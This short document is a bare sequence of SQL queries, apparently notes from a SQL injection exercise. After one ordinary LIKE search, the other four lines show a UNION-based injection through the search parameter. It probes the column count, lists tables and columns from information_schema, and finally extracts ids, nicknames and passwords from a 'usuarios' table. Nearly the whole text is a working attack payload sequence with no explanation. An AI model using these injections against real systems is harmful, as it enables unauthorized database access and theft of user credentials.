SELECT ? FROM ? WHERE ? LIKE '%boli%';
SELECT ? FROM ? WHERE ? LIKE '%A4' UNION (SELECT 1,2,3 FROM dual);-- %';
SELECT ? FROM ? WHERE ? LIKE '%A4' UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3 FROM information_schema.tables);-- %';
SELECT ? FROM ? WHERE ? LIKE '%A4' UNION (SELECT COLUMN_NAME,2,3 FROM information_schema.columns WHERE TABLE_NAME='usuarios');-- %';
SELECT ? FROM ? WHERE ? LIKE '%A4' UNION (SELECT id,nick,password FROM usuarios);-- %';
